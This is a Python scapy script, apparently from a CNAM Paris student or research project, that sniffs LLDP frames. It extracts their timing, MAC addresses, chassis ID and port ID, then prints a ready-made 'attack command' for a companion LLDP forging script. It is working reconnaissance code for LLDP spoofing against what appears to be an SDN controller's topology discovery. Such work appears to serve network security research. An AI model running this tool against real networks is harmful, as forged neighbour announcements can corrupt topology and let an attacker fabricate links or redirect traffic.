#!/usr/bin/python3
# Flavien JOLY POTTUZ / CNAM PARIS
# All rights reserved
# April 2020

from scapy.all import sniff
from scapy.contrib.lldp import *
from threading import Thread
import argparse


class LLDPHandler(object):

    def LLDPSniff(self):
        # Sniff LLDP packets, if ethertype = 0x88cc
        # We are capturing two packets, this helps us to fit to the timer set in the controller :)
        sniff(store=0, prn=self.LLDP, count=2, filter="ether proto 0x88cc")

    def LLDP(self, pkt):
        if not hasattr(self, 'pkt_1'):
             self.pkt_1 = pkt.time
             print("Frame 1 captured...")
        else :
             self.pkt_2 = pkt.time
             print("Frame 2 captured...")
        if hasattr(self, 'pkt_2'):
            delta = round(self.pkt_2 - self.pkt_1)
            print("======= Frame Analysis =======")
            print(f"Delta LLDP send : {delta}")
            print(f"Source M@C : {pkt[Ether].src}")
            print(f"Destination M@C : {pkt[Ether].dst}")
            print(f"LLPDU Chassis ID : {pkt[LLDPDUChassisID].id}")
            print(f"LLPDU Port ID : {(pkt[LLDPDUPortID].id).decode('utf-8')}")
            print("======= Attack command =======")
            if args.nohup :
                print(f"ip netns exec {args.target} nohup python3 lldp_forge.py --delta {delta} "
                      f"--eth-mac-src {pkt[Ether].src}  --eth-mac-dst {pkt[Ether].dst} "
                      f"--chassis-mac {pkt[LLDPDUChassisID].id}  --source-port {pkt[LLDPDUPortID].id.decode('utf-8')} "
                      f"&")
            else :
                print(f"ip netns exec {args.target} python3 lldp_forge.py --delta {delta} "
                      f"--eth-mac-src {pkt[Ether].src}  --eth-mac-dst {pkt[Ether].dst} "
                      f"--chassis-mac {pkt[LLDPDUChassisID].id}  --source-port {pkt[LLDPDUPortID].id.decode('utf-8')}")

    def StartLLDPSniff(self):
        # Start packet listening thread
        print("Starting LLDP Packet Sniffing...")
        sniffer = Thread(target=self.LLDPSniff())
        sniffer.start()


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", help="Target - used for cmd generation !",
                        type=str, required=True)
    parser.add_argument("--nohup", help="Use nohup for cmd generation",
                        action='store_true', required=False)
    args = parser.parse_args()
    try:
        print("Start LLDP Attack")
        lldp_handler = LLDPHandler()
        lldp_handler.StartLLDPSniff()
    except KeyboardInterrupt:
        print("\nStop LLDP Sniffing...")
